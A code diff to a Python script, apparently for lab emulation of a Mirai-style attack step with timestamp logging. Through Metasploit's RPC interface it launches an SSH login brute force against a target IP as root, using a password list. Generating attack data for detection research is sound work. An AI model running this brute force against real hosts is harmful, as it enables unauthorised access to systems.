@@ -29,18 +29,23 @@ def main(argv):
     record_timestamp(folder, output_time_file_start)
     time.sleep(2)
 
-    # put the attack launch command
-    auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-    auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
-    auxiliary['USERNAME'] = "root"
-    auxiliary['RHOSTS'] = target_ip
-    auxiliary['RPORT'] = 22
-    auxiliary['VERBOSE'] = True
+    try:
+        # put the attack launch command
+        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
+        auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
+        auxiliary['USERNAME'] = "root"
+        auxiliary['RHOSTS'] = target_ip
+        auxiliary['RPORT'] = 22
+        auxiliary['VERBOSE'] = True
 
-    auxiliary.execute()
-    print(client.jobs.list)
-    while client.jobs.list:
-        time.sleep(1)
+        auxiliary.execute()
+        print(client.jobs.list)
+        while client.jobs.list:
+            time.sleep(1)
+    
+    except Exception as e:
+        print(e)
+        pass
 
     time.sleep(10)
     output_time_file_end = 'time_step_2_mirai_end.txt'
